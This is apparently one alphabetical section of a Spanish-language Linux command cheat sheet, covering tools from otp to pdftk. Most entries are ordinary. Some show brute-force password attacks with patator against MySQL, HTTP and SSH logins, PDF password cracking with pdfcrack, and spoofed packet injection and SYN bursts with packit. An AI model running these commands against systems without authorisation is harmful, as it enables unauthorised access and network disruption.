$ otp -c6 -S3 -n5 (Creará 5 contraseñas [-n] por defecto son 50, de 6 letras mayúsculas [-c] separadas por un guión de 3 en 3 [-S] por defecto son de 4 en 4)
Algunas opciones:
-d8 (Empleando sólo 8 números)
-l6 (6 letras en minúscula)


ots
Lee un texto y decide qué frases son importantes y cuáles no.
$ ots texto.txt -h > salida.html (crea un breve resumen, resalta la idea principal en el texto y el resultado a un archivo html)
$ ots -a texto.txt (solo genera el resumen)


outguess
Herramienta de encriptación
$ outguess -k password -d mensaje.txt imagen.jpg resultado.jpg (Embebe el mensaje en una imagen con la contraseña especificada)
$ outguess -k password -r resultado.jpg mensaje.txt  (saca el mensaje de la imagen)


owl
Instalador de paquetes para archlinux.
$ owl refresh  (Refrescar la lista de paquetes)
$ owl update (Refrescar la lista y actualizarlos [-Syu])
$ owl pull (Actualizar AUR)
$ owl install paquete (Instalar un paquete [-S]
$ owl upgrade paquete (Actualizar el paquete)
$ owl downgrade paquete (Desactualizar paquete)
$ owl remove paquete (Eliminar paquete)
$ owl download paquete (Descargar el paquete de AUR)
$ owl search palabra (Buscar palabras relacionadas)
$ owl query palabra (Buscar palabra relacionada en local)
$ owl info paquete (Buscar información de paquete)
$ owl deps paquete (Mirar dependencias)
$ owl version paquete (Ver la versión del paquete)
$ owl description paquete (Ver descrición del paquete)
$ owl list paquete (listar los paquetes que se instalan con paquete)
$ owl orphans (Listar poquetes de AUR instalados y desatendidos)


owncloud
[apache2 php5 php-pear php-xml-parser php5-sqlite php5-json sqlite php5-mysql mp3info curl libcurl3 libcurl3-dev php5-curl zip php5-gd]. Nube de almacenamiento tipo dropbox, minux, google-drive ... pero no comercial y libre, gestionado totalmente via web. Descargar de <http://owncloud.org/> la última versión. Una vez bajado el paquete tar.bz2:
$ tar -xvf owncloud*.tar.bz2 (Descomprimir)
$ mv owncloud /var/www/ (mover la carpeta al directorio web)
# chown -R www-data:www-data /var/www/owncloud (Crear usuario y grupo)
# /etc/init.d/apache2 restart (reiniciar apache2)
Terminar la configuración [administrador, contraseña, base de datos..) abriendo en el navegador la dirección:
http://localhost/owncloud
Todo lo que se arrastra a la ventana del navegador se incluye en la nube.


p0f
identifica huellas de sistemas operativos de forma pasiva (solo escuchando)
# p0f -i eth0
# p0f -A -i eth0  (averiguar conexiones que nos realizan o pasan por nuestra máquina)
# p0f -R -i eth0  (con conexiones que nos rechazan el tráfico)
Nota.- Lanzar la aplicación, visitar distintas páginas con el navegador y mirar en la consola lo que aparece.


p11tool
[gnutls]. Programa que permite operar con tarjetas inteligentes PKCS #11 y módulos de seguridad. Para usar los tokens de PKCS #11 con GnuTLS, los archivos de configuración de p11-kit necesitan ser configurados, es decir, crear un fichero en /etc/pkcs11/module con el contenido módule /path/to/pkcs11.so. Alternativamente, el archivo de configuración /etc/gnutls/pkcs11.conf tiene que existir y contener un número de líneas de la forma 'load=/usr/lib/opensc-pkcs11.so'.
$ p11tool --list-tokens (enumera todos los códigos disponibles)
$ p11tool --list-token-urls (enumera las URLs de los códigos disponibles)
$ p11tool --list-all (enumerar todos los objetos disponibles en un código)
$ p11tool --list-all-certs (todos los certificados disponibles en un código)
$ p11tool --list-all-privkeys (las claves privadas disponibles en un código)


paccache
[pacman-contrib]. Limpiar caché de paquetes en Manjaro.
# paccache -r (eliminar versiones antiguas y mantener solo la versión más reciente de cada paquete)
# paccache -r -k 2 (mantener las dos versiones más recientes de cada paquete)
# paccache -c -r (simular limpieza sin eliminar nada)
# paccache -r -k 1 --keep-uninstalled (eliminar caché de paquetes no instalados)


pacdiffviewer
En Arch, busca archivos de configuración nuevos y obsoletos [pacnew, pacsave] para gestionarlos [eliminarlos, reemplazarlos..]


package-update-indicator
Utilidad que comprueba periódicamente las actualizaciones de software y notifica al usuario sobre las actualizaciones disponibles mediante notificaciones de escritorio y/o un icono de notificación de estado o un icono en la bandeja del sistema.


packer
(gui: blinky). Gestor rápido de paquetes pacman y aur con funcionalidades básicas [-Ss , -S, -Syu y -Si]. Para evitar conflictos entre rutas de pacman y aur, instalar diffpac.
$ packer -S --noconfirm paquete  (Instalar sin pedir confirmación)
$ packer -Syu --auronly (Actualizar y sincronizar sólo los paquetes de aur)
$ packer -Si paquete (información sobre paquete)
$ packer -G paquete (descargar sin instalar un tarbal de aur)


packit
Herramienta de auditoría de red [Packet toolkit]. Su valor se deriva de su capacidad para personalizar, inyectar, monitorear y manipular el tráfico IP. Al permitirle definir [spoof] casi todas las opciones de encabezado TCP, UDP, ICMP, IP, ARP, RARP y Ethernet, Packit puede ser útil para probar cortafuegos, sistemas de detección/prevención de intrusiones, escaneo de puertos, simulación de tráfico de red y auditoría general TCP/IP.
# packit -t UDP -d 192.168.1.4 -D 1024 -i x10 -h (inyección de paquetes UDP con respuesta de host [-h])
# packit -m cap 'tcp and not port 22' (imprimir todas las comunicaciones TCP que no giren en torno a SSH [puerto 22])
# packit -m cap -c 10 -w /tmp/mylog 'icmp' (escribir los primeros 10 paquetes ICMP capturados en un archivo)
# packit -t icmp -s 22.03.55.9 -d 192.168.0.1 -c 10 -h (Inyectar 10 paquetes ICMP tipo 8 [petición de eco] desde el host '22.03.55.9' al host '192.168.0.1' y esperar una respuesta)
# packit -t icmp -K 18 -d 127.0.0.1 -N 211 -G 255.255.255.0 (Inyectar paquete de tipo ICMP 18 [respuesta de máscara] con un ID ICMP de 211 y máscara de dirección de 255.255.255.255.0)
# packit -sR -d www.microsoft.com -F S -c 5 -W 666 -eR -E f:00:d:f:00:d -p 'HI BILL' -v  (Inyectar 5 paquetes TCP desde hosts aleatorios a 'www.microsoft.com' con el flag set SYN, con tamaño de ventana de 666, dirección ethernet de fuente aleatoria, una dirección ethernet de destino de f:00:d:f:00:d, con una carga útil de "HI BILL", mostrando cada paquete inyectado)
# packit -s 192.168.0.1 -d 192.168.0.20 -S 403 -D 80 -F SR -q 12345678910 -c 1000 -b 20 -e 0:0:0:0:0:0  (Inyectar un total de 1000 paquetes TCP en ráfagas de 20 paquetes por segundo desde 192.168.0.1 en el puerto 403 hasta 192.168.0.20 en el puerto 80 con los indicadores SYN y RST configurados, un número de secuencia de 12345678910 y una dirección ethernet de origen de 0:0:0:0:0:0:0)
# packit -s 10.22.41.6 -d 172.16.1.3 -D 1-1024 -F S -v (Inyectar paquetes TCP de 10.22.41.6 a 172.16.1.3 en puertos de 1-1024 con el indicador SYN activado, mostrando cada paquetes que enviamos)
# packit -m trace -t UDP -d 192.168.2.35 -S 53 (Aparecer como una respuesta DNS utilizando el puerto de origen UDP 53)
# packit -m trace -t TCP -d www.google.com -S 80 -FS (Aparecer como tráfico HTTP utilizando el puerto TCP 80)


paclist
Lista los paquetes instalados del repositorio especificado.
$ paclist community (otras opciones: core, archlinuxfr, extra)


pacman
Gestor de programario de distros archlinux. Ver tambien yaourt.
# pacman -S prog1 prog2 (intalar/actualizar paquetes y dependencias)
# pacman -S extra/paquete (especificando versión- extra o testing-)
# pacman -Sc (Borrar paquetes de versiones viejas)
# pacman -Scc (Borrar caché de pacman - /var/cache/pacman/pkg -)
# pacman -Si paquete (buscar información de paquete)
# pacman -Ss paquete (buscar por nombre o descricion paquete)
# pacman -Sw paquete (Bajar un paquete sin instalarlo)
# pacman -Sy paquete  (Sincronizar e instalar)
# pacman -Syu (sincronizar y actualizar todo el sistema)
# pacman -Sh (Ver las opciones de sincronización de la base de datos)
# pacman -R paquete (borrar dejando las dependencias instaladas)
# pacman -Rs paquete  (borrar con dependencias no usadas por otros)
# pacman -Rsn $(pacman -Qdtq) (Borra paquetes huerfanos)
# pacman -R --nosave paquete (Borra el paquete y toda la configuración).
# pacman -Rdd paquete (Forzar la eliminación de un paquete).
# pacman -Qh (Ver opciones de consultas locales de la base de datos)
# pacman -Qi paquete (información de un paquete local)
# pacman -Qs paquete (buscar en los paquetes instalados)
# pacman -Qm (Buscar paquetes que no estan en los repos)
# pacman -Ql paquete (Listar los archivos contenidos en un paquete)
# pacman -Qo /ruta/a/archivo (a qué paquete pertenece un archivo)
# pacman -Qdt (Busca paquetes huerfanos, sin borrarlos)
# pacman -U /ruta/al/paquete/paquete-version.pkg.tar.gz (Ins. local)
# pacman-optimize && sync (agrupar información)
# pacman-db-upgrade (Recargar la base de datos)


pacman-color
Igual que pacman pero coloreando algunas partes de la salida (repositorio, versión, si está instalado...)


pacman-optimize
Reagrupa archivos fragmentados de la base de datos de pacman
# pacman-optimize


pacmd
Herramienta para reconfigurar un servidor de sonido PulseAudio.
$ pacmd
$ pacmd list-sinks (verificar los dispositivos de audio disponibles)


pacsearch
Buscar paquetes arch (Equivalente a pacman -Ss )
$ pacsearch mail


pactl
Se utiliza para gestionar la reproducción de audio, controlar los dispositivos de audio y manejar el servidor de sonido PulseAudio.
$ pactl list sinks short (ver lista de dispositivos de audio disponibles conectados con el sistema)
$ pactl get-default-sink (tarjeta por defecto)
$ pactl get-default-source (nombre simbólico de la fuente por defecto)
$ pactl set-default-sink alsa_output.pci-0000_00_1f.3.analog-stereo (cambiar el dispositivo de audio por defecto)
$ pactl set-sink-volume 0 +5% (gestionar el volumen del sonido)
$ pactl set-sink-volume 0 -5%
$ pactl set-sink-mute 0 toggle (silenciar)
$ pactl list cards (información sobre la tarjeta de sonido)
$ pactl info (información del dispositivo)


pactree
Muestra dependencias de un paquete.
$ pactree -c opera (muestra el arbol coloreado)
$ pactree -u opera (lo muestra de forma lineal y sin duplicados)
$ pactree -g htop > archivo (envia la salida a un archivo que puede ser interpretado por la aplicación de graficos graphviz [ver])


pacworld
Herramienta para comprobar la consistencia de la base de datos y arreglar paquetes rotos.
# pacworld -v --exec


pads
Monitor de tráfico de red
# pads -i eth0


pagein
Herramienta para forzar que las páginas que estan en swap vuelvan a la memoria.
# pagein -a (Intentar paginar en todos los procesos. No se puede utilizar con la opción -p)
# pagein -p 949 (indicando el PID de un proceso)


pagemon
Herramienta de monitoreo de memoria interactiva basada en ncurses que permite explorar el mapa de memoria de un proceso activo en ejecución.
# pagemon -p PID
# pagemon -p proceso


pal
Calendario con eventos [para us, australia, austria, musicales ...]. Al ejecutar por primera vez la aplicación, se crea el archivo ~/pal/pal.conf donde podrán deshabilitarse los eventos que no interesan. Para activar que las semanas empiecen por lunes:
$ nano .pal/pal.conf
week_start_monday
$ pal -c 10 (Muestra el calendario con 10 lineas. Por defecto 5)
$ pal --color (Lo muestra a color. --nocolor para blanco y negro)


pandoc
Conversor de formatos de documentos. La entrada puede ser cualquier documento en haskell, markdown, rst, html, txt o latex y la salida, txt, haskell, markdown, rst, html, latex,man, context, texinfo, docbook, opendocument, odt, s5 o rtf.
$ pandoc -o salida.html entrada.md (Convertir markdown a html)
$ pandoc -f markdown -t org -o salida.org entrada.md (Convertir markdown a org-mode)
$ pandoc entrada.txt -o salida.pdf (Convertir txt a pdf)
$ pandoc texto.txt -o libro.epub (Convertir a epub)
$ pandoc -f html -t markdown -o pagina.md pagina.html (Convertir de html a markdown)
$ pandoc -f markdown -t latex -o texto_latex.tex texto_markdown.md (Convertir texto en markdown a latex)
$ pandoc -f gfm -o salida.html entrada.txt (Desactiva el soporte de TEX a la hora de leer [no interpreta codigo TeX])


paplay
Reproducción de audio en formatos pulseaudio (flac)
$ paplay archivo.flac


parallel
Ejecutar varias aplicaciones o argumentos en paralelo.
$ parallel ip ::: "addr" "route show" "n" (mostrará la resolución de los 3 argumentos del comando ip)
$ parallel echo ::: "Linux es" "Debian es" "Vivir es" ::: "genial" "fantástico" "brutal"
$ parallel ::: who 'ip a' pwd (mostrará la resolución de los 3 comandos)
$ parallel ::: echo 'uname -a' echo 'ip a' echo lspci (dejando un espcaio entre comandos)


paris-ping
[paris-traceroute]. Nueva versión de la herramienta ping [ver]
# paris-ping lapipaplena.org


paris-traceroute
Nueva versión de la herramienta traceroute [ver].
# paris-traceroute lapipaplena.org


parsero
Es un script escrito en Python que lee el archivo Robots.txt de un servidor web a través de la red y examina las entradas Disallow. Las entradas Disallow indican a los motores de búsqueda qué directorios o archivos alojados en un servidor web no deben indexarse. Por ejemplo, "Disallow: /portal/login" significa que el contenido de www.example.com/portal/login no puede ser indexado por rastreadores como Google, Bing, Yahoo o el que proceda.
$ parsero -u localhost
$ parsero -sb -u google.es
$ parsero -f archivo.txt (de varias url, una por linea, de un archivo)


partclone
Software diseñado para realizar backups y restauración de particiones. Realizar las operaciones sobre particiones no montadas.
$ partclone.ext4 -c -d -s /dev/sda1 -o ~/imagen.img (Crear la imagen de sda1)
$ partclone.ext4 -r -d -s ~/imagen.img /dev/sda1 (Restaurar la imagen sobre la particion sda1)


parted
Formatear y crear particiones en discos y unidades extraibles. A continuación se muestra el proceso:
Entrar en el prompt:
	# parted
	GNU Parted 3.2
	Using /dev/sda
	Welcome to GNU Parted! Type 'help' to view a list of commands.
	(parted)
Tecleando ? o help muestra todos los comandos. Identificar los discos.
	(parted) print devices
	/dev/sda (500GB)
	/dev/sdc (2022MB)
Imaginemos que queremos trabajar sobre el /dev/sdc. La seleccionamos:
	(parted) select /dev/sdc
	Using /dev/sdc
A partir de ahora no es necesario especificar device puesto que todo será referido a /dev/sdc.
	(parted) print
	Model: Intenso Business (scsi)
	Disk /dev/sdc: 2022MB
	Sector size (logical/physical): 512B/512B
	Partition Table: msdos
	Disk Flags:
	Number  Start   End     Size    Type     File system  Flags
	 1      1049kB  2022MB  2021MB  primary  fat32
	(parted)
Borrar la tabla de particiones y comprobar que "print" no muestra datos como en el caso anterior:
	(parted) rm 1
	(parted) print
	Model: Intenso Business (scsi)
	Disk /dev/sdc: 2022MB
	Sector size (logical/physical): 512B/512B
	Partition Table: msdos
	Disk Flags:
	Number  Start  End  Size  Type  File system  Flags
	(parted)
Crear nueva etiqueta de disco (algunas opciones: bsd, gpt[IBM], mac, msdos...). Parted nos informa que a partir de este punto se perderan los datos de este disco y si queremos continuar (teclear "yes"):
	(parted) mklabel msdos
	Warning: The existing disk label on /dev/sdb will be destroyed and all data on this disk will be lost. Do you want to continue? Yes/No? yes
	(parted)
Creamos la nueva partición (sin sistema de archivos) contestando a cada pregunta y con "print" verificamos el resultado:
	(parted) mkpart
	Partition type?  primary/extended? primary
	File system type?  [ext2]? ext4
	Start? 1
	End? 2022MB
	(parted) print
	Model: Intenso Business (scsi)
	Disk /dev/sdc: 2022MB
	Sector size (logical/physical): 512B/512B
	Partition Table: msdos
	Disk Flags:
	Number  Start   End     Size    Type     File system  Flags
	 1      1000kB  2022MB  2021MB  primary  ext4         lba
	(parted)
Con parted podemos dar formato a la partición pero recomiendan hacer uso de herramientas especificas para ello (mkfs.ext4, e2fsprogs), además no soporta ni ext3 ni ext4 (aunque como podemos ver en "File system" dice ext4), sólo ext2 y según el dispositivo, solo fat32. Otros comandos que podemos usar dentro del prompt de parted son:
	print all (Para ver más información de los dispositivos conectados)
	mklabel (Pregunta nuevo sistema de archivos [msdos, bsd, mac...])
	print free (Ver espacio libre de los dispositivos)
	check NUM (Chequear una partición especificada con NUM)
	rescue INICIO FIN (Recuperar una partición especificando bytes del inicio y final)
	quit (Salir del prompt)


partprobe
Releer la tabla de particiones después de alguna modificación en ella, sin necesidad de reiniciar.
# partprobe
# partprobe /dev/sda (especificando un disco)
# partprobe -s (resumen de las particiones)


partx
Informa sobre particiones y discos.
# partx -s /dev/sda (Mostrar el número de particiones)
# partx -b /dev/sda (Muestra las medidas de las particones)
# partx -s /dev/sda4 /dev/sda (Información sobre las partición núm 4 de sda)
# partx -l /dev/sda (Listar las particiones)


pass
Gestión de archivos de contraseñas. Cada contraseña está dentro de un archivo encriptado gpg cuyo nombre de archivo es el título del sitio web o recurso que requiere la contraseña. Todas las contraseñas se guardan en ~/.password-store y pass proporciona comandos para añadir, editar, generar o recuperar contraseñas.
$ pass init "Cripta supersecreta" (primer paso para crear el archivo .password-store. Pedirá contraseña y confirmación)
$ pass insert Mails/nombre@site.com (guardar en la carpeta "Mails" un correo. Pedirá contraseña y confirmación)
$ pass nombre@site.com (despues de introducir la contraseña entrada en "init", pondra la de nombre@site.com)
$ pass -c nombre@site.com (despues de introducir la contraseña entrada en "init" guardará la contraseña de nombre@site.com en el portapapeles)
$ pass generate Mails/registro.com 12 (generar una contraseña de 12 caracteres del sitio "registro.com" y la guardar en la capeta "Mails" de pass)
$ pass generate -i Mails/registro.com 18 (subsdtituirá la que exista por otra de 18 caracteres)
$ pass rm Mails/nombre@site.com (eliminar los datos de un email guardado)
$ pass (ver la estructura del archivo .password-store)
$ pass ls (lo mismo)
$ pass show Mails (mostrar todos los correos de la carpeta "Mails")
$ pass grep contraseña (busca "contraseña" y muestra a qué sitio pertenece y en que carpeta está)
$ pass find .com (muestra los sitios entrados con *.com)
$ pass search .com (lo mismo)
$ pass insert -m Mails/nombre@site.com (una vez entrada la contraseña podrán entrarse datos hasta finalizar con C-d)
$ pass Mails/nombre@site.com (Muestra los datos auxiliares que se han entrado menos la contraseña)


passmgr
Administrador de contraseñas.
$ passmgr (forma básica de abrir la interfaz con los parámetros por defecto)
$ passmgr -clipboardTTL 20 (que en la sesión actual la contraseña esté en el portapapeles 20 segundos. Por defecto 15)
$ passmgr -appTTL 180 (que la sesión actual no se cierre hasta los 180 segundos de inactividad. Por defecto 120)
$ passmgr -change-key (cambiar la contraseña de la aplicación. Pide la contraseña antigua y despues entrar la nueva y confirmarla)


passwd
Cambiar contraseñas
# passwd -f usuario        (Cambia por completo los datos del usuario)
# passwd -l root              (Desactiva la contraseña root)
# passwd usuario            (Solicita la contraseña de usuario y la restablece)


paste
Combina archivos, juntando las primeras lineas con las primeras, las segundas con las segundas...
	$ paste 1.txt 2.txt > 3.txt
	$ paste -d'\n' 1.txt 2.txt > 3.txt (con un salto de linea para cada linea)


patat
[cabal-install]. Herramienta que permite mostrar presentaciones en una terminal. Utiliza la librería Pandoc, la cuál, además de ofrecer soporte para Markdown, también permite una infinidad de formatos de entrada. No muestra imágenes y los para los resaltados (negrita, cursiva...) usa colores. Una vez instalado el paquete (apt-get install cabal-install) añadir a .bashrc la linea:
	export PATH=$PATH:$HOME/.cabal/bin
He instalar como usuario sin privilegios el paquete:
	$ cabal install patat
$ patat presentacin.md (arrancar la presentación)
Teclas de control:
    Siguiente: espacio, enter, l, →
    Anterior: retroceso, h, ←
    Adelantar 10 diapositivas: j, ↓
    Retroceder 10 diapositivas: k, ↑
    Ir a la primera: 0
    Ir a la última: G
    Actualizar: r
    Finalizar: q


patator
Para ataques de adivinación de contraseñas por fuerza bruta. Incluye varios modulos que empiezan por el protocoll al que atacan: ftp_, ssh_, telnet_,http_, mysql_ ...
# patator mysql_login user=root password=FILE0 0=/root/passes.txt host=127.0.0.1 -x ignore:fgrep='Access denied for user' (ataque de fuerza bruta MySQL [mysql_login] con el usuario root [usuario=root] y las contraseñas contenidas en un archivo [password=FILE0 0=/root/passes.txt] contra el host dado [host=127.0.0.1], ignorando la cadena especificada [-x ignore:fgrep='Acceso denegado al usuario'])
# patator http_fuzz auth_type=basic url=http://10.1.1.15 user_pass=FILE0 0=./passwd_lists/user_pass.txt -x ignore:code=401 (ataque html básico, a la url especificada con las contraseñas contenidas en ./passwd_lists/user_pass.txt, ignorando la cadena mencionada)
# ssh_login host=10.0.0.1 user=FILE0 0=logins.txt password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3


patch
Herramienta que permite aplicar un parche a un determinado fichero o directorio. Toma un fichero que contiene un listado de diferencias producidas por el programa diff y esas diferencias se aplica a uno o más archivos. Los nombres de los archivos para ser parcheado por lo general se toman del fichero del parche, pero si hay un solo archivo para ser parcheado puede ser especificado en la línea de comandos como originalfile.
1.-
Aplicar un parche a una aplicación instalada.
$ wget http://host/parche.patch  (Descargar el parche)
# patch --backup /usr/bin/aplicacion_a_parchear ~/parche.patch
Un ejemplo completo en archivos de texto:
Tenemos dos ficheros, file1 (archivo original) y file2 (archivo modificado) con el siguiente contenido:
	$ cat file1
	Me gusta linux
	$ cat file2
	Me gusta la libertad
Generar el parche parche con el comando diff:
	$ diff -u file1 file2 > file.patch
	$ cat file.patch
	--- file1	2013-11-02 03:14:28.466555864 +0100
	+++ file2	2013-11-02 03:14:46.230555684 +0100
	@@ -1 +1 @@
	-Me gusta linux
	+Me gusta la libertad
Tenemos un tercer fichero con el siguiente contenido:
	$ cat file3
	Me gusta linux
	No uso programario privativo
Y queremos parchearlo con el archivo que hemos creado previamente. El resultado sería el siguiente:
	$ patch file3 < file.patch
	patching file file3
	$ cat file3
	Me gusta la libertad
	No uso programario privativo
Para anular un parche previamente aplicado:
	$ patch -R file3 < file.patch
	patching file file3
	$ cat file3
	Me gusta la libertad
	No uso programario privativo
$ patch -p0 < parche.patch (Aplica un parche .patch en el directorio actual. El parámetro p indica a partir de que nivel inferior de subdirectorio hay que aplicar el parche. El 0 es para el directorio actual)
$ patch -R -p0 < parche.patch (Deshace los cambios aplicados por el parche anterior)


path
Ruta para acceder a los datos contenidos en una unidad de almacenamiento.
# echo $PATH | tr ':' '\\n'   (mostrará los dirs de los ejecutables)


pathchk
[coreutils]. Comprueba si un nombre de fichero es válido o portable en sistemas POSIX.
$ pathchk -p Juegos del niño
pathchk: el nombre del fichero «niño» contiene el caracter no portable «ñ»


patool
puede crear, extraer, probar, enumerar, comparar, buscar y recomprimir varios formatos de archivo. El formato de archivo se determina con el archivo y como alternativa por la extensión del archivo.
patool admite 7z (.7z), ACE (.ace), ADF (.adf), ALZIP (.alz), AR (.a), ARC (.arc), ARJ (.arj), BZIP2 (.bz2), CAB (.cab), comprimir (.Z), CPIO (.cpio), DEB (.deb), DMS (.dms), FLAC (.flac), GZIP (.gz), ISO (.iso), LZH ( .lha, .lzh), LZIP (.lz), LZMA (.lzma), LZOP (.lzo), RAR (.rar), RPM (.rpm), RZIP (.rz), SHAR (.shar), SHN Formatos (.shn), TAR (.tar), XZ (.xz), ZIP (.zip, .jar) y ZOO (.zoo). Se basa en aplicaciones auxiliares para manejar esos formatos de archivo (por ejemplo, bzip2 para archivos BZIP2). Los formatos de archivo TAR, ZIP, BZIP2 y GZIP son compatibles de forma nativa y no requieren la instalación de aplicaciones auxiliares.
$ patool extract archivo.zip archivo.rar (crear un directorio de cada archivo especificado)
$ patool --verbose test ubuntu.iso (reealizar un test de una iso)
$ patool list package.deb (ver el contenido de un .deb)
$ patool diff file.rar file.zip (comparar si exiten diferencias entre dos archivos comprimidos)
$ patool repack archivo.zip archivo.rar (reparar un .zip y guardar como .rar)
$ patool recompress archivo.rar (recomprimir un archivo)


pbzip2
Comprensión en paralelo que puede usarse en máquinas de más de un nucleo. Las opciones de uso son las mismas que bzip2.


pcaputils
Incluye las siguientes utilidades basadas en libpcap:  pcapip [filtra un archivo pcap de entrada basándose en un archivo que contiene direcciones IP],  pcappick [selecciona fotogramas específicos de un pcap por número],  pcapuc [imprime IP src únicas, IP dst o pares de IP {src, dst} presenciados] y pcapdump [una utilidad de captura de paquetes similar a dumpcap]


pcimodules
[pciutils]. Enumera todos los módulos de controladores para todos los dispositivos PCI conectados.
# pcimodules (básico)
# pcimodules --class 0x20000 --classmask 0xffff00 (los correspondientes a eternet)


pcmanfm
Gestor de archivos
$ pcmanfm --set-wallpaper /home/USER/images/limagen.jpg (colocar fondo)
Algunos atajos:
        Ctrl+1 	vista de íconos
        Ctrl+2 	compacta
        Ctrl+3 	miniaturas
        Ctrl+4 	mostrar detalles
        Ctrl+h 	mostrar archivos ocultos
        Ctrl+d 	Establecer marcador para el dir actual y aparecerá automáticamente en el panel lateral
        F3 	en modo de 2 paneles
        F6      canvia el foco del panel lateral a las carpetas y viceversa
        F9      mostrar/ocultar panel lateral
        F10     activa el menú principal
        Alt-d   Salta a la direcciones de interés
$ pcmanfm --wallpaper-mode=mode (Configura el modo del fondo de pantalla. Los modos son:)
        color (rellenar con un color sólido),
        stretch (estirar para cubrir todo el monitor),
        fit (estirar para ajustarse al tamaño del monitor),
        center (colocar en el centro del monitor),
        tile (mosaico para cubrir todo el monitor),
        crop (estirar y recortar para cubrir todo el monitor) o
        screen (estirar para cubrir toda la pantalla).
$ pcmanfm -w ~/fondos_pantalla/emacs.png (poner una imagen de fondo de pantalla)
1.-
Creacion de un icono en el escritorio:
$ mkdir Desktop
$ touch Desktop/home.desktop
Y para lanzar thunar, pegar el contenido:
	[Desktop Entry]
	Encoding=UTF-8
	Version=1.0
	Type=Application
	Terminal=false
	Exec=thunar
	Name=Personal
	Icon=/usr/share/icons/gnome/32x32/places/user-home.png
Nota.- Revisar la ruta del icono.
2.-
Para abrir ventanas y no tabs en pcmanfm solo si se abren por terminal, colocar en .bashrc la linea.
alias pcmanfm='pcmanfm -n'


pdb
Debuger de código python.
$ pdb archivo.py


pdd
Utilidad para calcular la diferencias entre fechas y horas. Si no se especifican argumentos, muestra la fecha, hora y zona horaria actuales.
$ pdd (forma básica para la fecha y hora actual actual)
$ pdd 2022 03 25 (calcular la ñdiferencia entre la fecha especificada y el dia de hoy)
$ pdd 23:05:00 (calcular la diferencia hasta el momento actual)
$ pdd 0 (hora actual)
$ pdd -d 1956 03 16 2023 11 23 (calcular la diferencia entre dos fechas)
$ pdd -t 01:50:00 09:55:00 (calcular la diferencia entre dos horas)
$ pdd -d 2023 11 14 1 1 10 --add (añadir 1 año, 1 mes y a0 dias a la fecha especificada)
$ pdd 1 1 10 --add (añadir 1 año, 1 mes y 10 dias a la fecha actual)
$ pdd -t 11:27:00 05:10:10 --add (añadir 5 horas, 10 minutos y 10 segundos a la hora especificada)
$ pdd 01:05:00 --add (mostrar la hora que será añadiendo 1 hora 5 minutos)
$ pdd -d 2023 03 02 0 0 2 --sub (restar un dia a la fecha especificada)
$ pdd --day 1956 03 16 (que dia de la semana era en la fecha especificada)


pdf2djvu
Convertir pdfs en djvu.
$ pdf2djvu -o salida.djvu archivo.pdf


pdf2htmlex
Convertir pdf a html sin perder texto ni formato. Soporta imágenes .png y .jpg.
$ pdf2htmlEX archivo.pdf archivo.html
$ pdf2htmlEX --split-pages 1 archivo.pdf (Guardando cada página en un archivo separado. Por defecto un solo archivo [0])
$ pdf2htmlEX --hdpi 200 --vdpi 200 archivo.pdf archivo.html (Especificando DPI horizontal y vertical)


pdf2ps
[psutils]. Convertir pdf a postscript. Ver ps2pdf
$ pdf2ps fichero.pdf
1.-
Proceso para disminuir el peso de un pdf:
$ pdf2ps entrada.pdf saliida.ps (Pasarlo a postcript)
$ ps2pdf saliida.ps resultado_reducido.pdf (Pasar el postscript nuevamente a pdf)


pdf2svg
Convetir pdfs a svg.
$ pdf2svg archivo.pdf salida.svg
$ pdf2svg archivo.pdf salida.svg 5 (Sólo la página 5)
$ pdf2svg archivo.pdf a%d.svg all (Convertir cada hoja en un svg con nombre tipo: a1.svg, a2.svg...)


pdfcrack
Craqueador de pdfs
$ pdfcrack -f archivo.pdf   (Sin especificaciones)
$ pdfcrack -f archivo.pdf -w /home/usuario/diccionario (con un diccionario)
$ pdfcrack archivo.pdf -n 6 -c abcdefghijklmnopqrstuvxyz -s
-n 6  (Hasta 6 caracteres)
-c ....(enumerar todas las opciones a probar)
-s     (Prueba el primer caracter en mayúscula)


pdfcrop
Herramienta que calcula y elimina los márgenes para cada página del archivo.
$ pdfcrop --margins '5 10 5 10' --clip entrada.pdf salida.pdf (nuevos margenes)


pdfdetach
Averigua si el pdf tiene archivos embebidos.
$ pdfdetach -list archivo.pdf


pdfimages
[xpdf-utils]. Extraer las imágenes de un pdf
$ pdfimages fichero.pdf fichero
$ pdfimages -j fichero.pdf fichero (guardarlas en formato jpeg)


pdfinfo
Muestra información del pdf.
$ pdfinfo archivo.pdf


pdfjoin
[pdfjam]. Unir varios pdf con el mismo formato de página en uno
$ pdfjoin --fitpaper true 1.pdf 2.pdf --outfile 12.pdf


pdflatex
Covertir archivos tex a pdf.
$ pdflatex texto.tex


pdfnup
[pdfjam]. Compactar varias páginas de un pdf en una y viceversa.
$ pdfnup --nup 2×4 archivo.pdf (8 páginas)
$ pdfnup --nup 2x1 --outfile output.pdf input.pdf (dos pàgines en una)
$ pdfnup --nup 2x2 --outfile output.pdf input.pdf  (4 páginas)


pdfopen
abrir un archivo pdf.
$ pdfopen -viewer evince archivo.pdf (con evince)
$ pdfopen -viewer evince -p 5 archivo.pdf (abrirlo por la página 5 con evince)


pdfresurrect
herramienta para la extracción/limpieza de metadatos de documentos pdf.
$ pdfresurrect -i archivo.pdf   (Información del creador del pdf)
$ pdfresurrect -w archivo.pdf  (Escribe las versiones y resumen del pdf al disco)
$ pdfresurrect -q archivo.pdf   (Muestra el número de versiones del pdf)
$ pdfresurrect -s  archivo.pdf  (Limpia todos los datos del pdf)


pdfseparate
Separa cada página de un pdf en un pdf.
$ pdfseparate sample.pdf sample-%d.pdf (si sample.pdf tiene 3 páginas crea sample-1.pdf, sample-2.pdf, sample-3.pdf)


pdfsig
Verifica las firmas digitales, caso de tenerlas, en un documento PDF y muestra la identidad de cada firmante y la hora y fecha de la firma. La validación del certificado del firmante usa los certificados confiables almacenados en la base de datos de firefox y en el archivo /etc/pki/nssdb.
	$ pdfsig archivo.pdf
	File 'archivo.pdf' does not contain any signatures


pdftk
Manipulación de pdfs
$ pdftk 1.pdf 2.pdf 3.pdf cat output 123.pdf (Unir PDFs y crear un pdf nuevo)
$ pdftk A=1.pdf B=2.pdf cat A B output 12.pdf (lo mismo utilitzando etiquetas)
$ pdftk *.pdf cat output todos.pdf (o utilitzando comodines)
$ pdftk A=one.pdf B=two.pdf cat A1-7 B1-5 A8 output combined.pdf (Separar páginas seleccionadas de distintos PDFs y crear uno nuevo)
$ pdftk revista.pdf cat 37-39 output 37_39.pdf (Separar páginas de un pdf)
$ pdftk revista.pdf cat 4 output 4.pdf (separar la 4 pagina)
